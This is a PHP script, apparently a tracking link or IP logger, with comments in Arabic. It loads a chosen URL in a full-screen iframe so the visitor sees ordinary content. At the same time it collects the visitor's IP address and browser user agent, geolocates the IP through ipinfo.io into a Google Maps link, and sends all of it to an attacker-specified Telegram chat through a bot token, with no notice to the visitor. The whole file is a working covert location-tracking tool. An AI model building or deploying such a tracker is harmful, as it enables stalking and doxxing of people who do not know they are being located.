<?php
function getLineFromFile($filename, $lineNumber) {
    if (!file_exists($filename)) {
        return null;
    }

    $lines = file($filename, FILE_IGNORE_NEW_LINES);
    if ($lineNumber > 0 && isset($lines[$lineNumber - 1])) {
        return trim($lines[$lineNumber - 1]);
    }

    return null;
}

// اسم الملف النصي
$filename = '../url.txt';

// الحصول على البيانات من الطلب
$lineNumber = isset($_GET['link']) ? intval($_GET['link']) : '';
$chatId = isset($_GET['ID']) ? $_GET['ID'] : '';
$idLineNumber = isset($_GET['ID2']) ? intval($_GET['ID2']) : null;

// قراءة الملف كمصفوفة من السطور
$lines = file($filename, FILE_IGNORE_NEW_LINES);

// استخراج السطر المطلوب (الفهرس يبدأ من صفر لذا نقوم بطرح واحد)
$desiredLine = '';
if ($lineNumber && isset($lines[$lineNumber - 1])) {
    $desiredLine = trim($lines[$lineNumber - 1]);
}

// جلب التوكن من الملف
$botToken = file_get_contents("../token.txt");

// الحصول على عنوان IP الخاص بالمستخدم
function getUserIP() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$ip = getUserIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// الحصول على الموقع الجغرافي باستخدام ipinfo.io
$locationData = @file_get_contents("http://ipinfo.io/{$ip}/json");
$location = json_decode($locationData);

if ($location && isset($location->loc)) {
    $coordinates = explode(',', $location->loc);
    $latitude = $coordinates[0];
    $longitude = $coordinates[1];
    $googleMapsLink = "https://www.google.com/maps/place/{$latitude},{$longitude}";
} else {
    $googleMapsLink = "Unknown Location";
}

// إعداد الرسالة
$message = "Location 🌎: {$googleMapsLink}\n";
$message .= "IP ✅: {$ip}\n";
$message .= "User Agent 📱: {$userAgent}\n";

// إرسال الرسالة عبر تليجرام
if ($botToken && $chatId) {
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    curl_exec($ch);
    curl_close($ch);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            height: 100%;
            margin: 0;
            overflow: hidden; /* لمنع التمدد في حال تمت إضافة عناصر جانبية */
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>

    <?php if (!empty($desiredLine)): ?>
        <iframe src="<?php echo htmlspecialchars($desiredLine); ?>" frameborder="0"></iframe>
    <?php endif; ?>

</body>
</html>
